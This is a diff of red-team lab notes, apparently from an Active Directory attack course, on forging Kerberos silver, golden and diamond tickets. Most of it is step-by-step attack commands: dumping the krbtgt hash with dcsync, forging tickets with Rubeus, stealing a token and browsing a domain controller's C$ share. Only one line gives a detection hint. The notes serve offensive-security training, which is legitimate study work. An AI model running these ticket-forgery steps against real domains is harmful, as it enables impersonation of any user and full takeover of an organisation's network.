@@ -12,7 +12,7 @@ Forged service ticket signed using the secret keys of a computer. You can forge 
 
     PS C:\Users\Attacker> Rubeus.exe silver /service:cifs/wkstn-1.dev.cyberbotic.io /aes256:3ad3c... /user:nlamb /domain:dev.cyberbotic.io /sid:S-1-5-21-569305411-121244042-2357301523 /nowrap
 
-import the ticket.
+3: Import the ticket:
 
     beacon> getuid
     [*] You are DEV\bfarmer (admin)
@@ -31,21 +31,48 @@ Useful ticket combinations:
 
 ## Golden Tickets
 
-Forged TGT signed by the domain's krbtgt account. Where a silver ticket can be used to impersonate any user, it's limited to either that single service or to any service but on a single machine. A golden ticket can be used to impersonate any user, to any service, on any machine in the domain, and the credentials are never changed automatically. For that reason, the krbtgt NTLM/AES hash is probably the single most powerful secret you can obtain (and is why you see it used in dcsync examples so frequently). Obtain the krbtgt hash by using dcsync from the context of a domain admin:
+Forged TGT signed by the domain's krbtgt account. Where a silver ticket can be used to impersonate any user, it's limited to either that single service or to any service but on a single machine. A golden ticket can be used to impersonate any user, to any service, on any machine in the domain, and the credentials are never changed automatically. For that reason, the krbtgt NTLM/AES hash is probably the single most powerful secret you can obtain (and is why you see it used in dcsync examples so frequently). 
+
+Because domain controllers don't track TGTs they have legitimately issued, they will accept TGTs that are encrypted with their own krbtgt hash.
+
+One way to detect the use of golden tickets is to look for TGS-REQs that have no corresponding AS-REQ. 
+
+1: Obtain the krbtgt hash by using dcsync from the context of a domain admin:
 
     beacon> dcsync dev.cyberbotic.io DEV\krbtgt
 
-1: Forge the ticket offline using Rubeus:
+2: Forge the ticket offline using Rubeus:
 
     PS C:\Users\Attacker> Rubeus.exe golden /aes256:51d7f3... /user:nlamb /domain:dev.cyberbotic.io /sid:S-1-5-21-569305411-121244042-2357301523 /nowrap
 
-2: Import into a logon session to use:
+3: Import into a logon session to use:
 
     beacon> execute-assembly Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFLz...
     beacon> steal_token 5060
     beacon> run klist
     beacon> ls \\dc-2.dev.cyberbotic.io\c$
 
+## Diamond Tickets
 
+Made by modifying the fields of a legitimate TGT that was issued by a DC. This is achieved by requesting a TGT, decrypting it with the domain's krbtgt hash, modifying the desired fields of the ticket, then re-encrypting it. This overcomes the aforementioned shortcoming of a golden ticket because any TGS-REQs will have a preceding AS-REQ.
 
+1: Prove we have no access to the DC:
 
+    beacon> getuid
+    beacon> ls \\dc-2.dev.cyberbotic.io\c$
+
+2: Create the diamond ticket:
+
+    beacon> execute-assembly Rubeus.exe diamond /tgtdeleg /ticketuser:nlamb /ticketuserid:1106 /groups:512 /krbkey:51d7... /nowrap
+
+where:
+
+    /tgtdeleg uses the Kerberos GSS-API to obtain a useable TGT for the current user without needing to know their password, NTLM/AES hash, or elevation on the host.
+    /ticketuser is the username of the user to impersonate.
+    /ticketuserid is the domain RID of that user.
+    /groups are the desired group RIDs (512 being Domain Admins).
+    /krbkey is the krbtgt AES256 hash.
+
+Rubeus describe will now show that this is a TGT for the target user.
+
+    PS C:\Users\Attacker> Rubeus.exe describe /ticket:doIFYj...
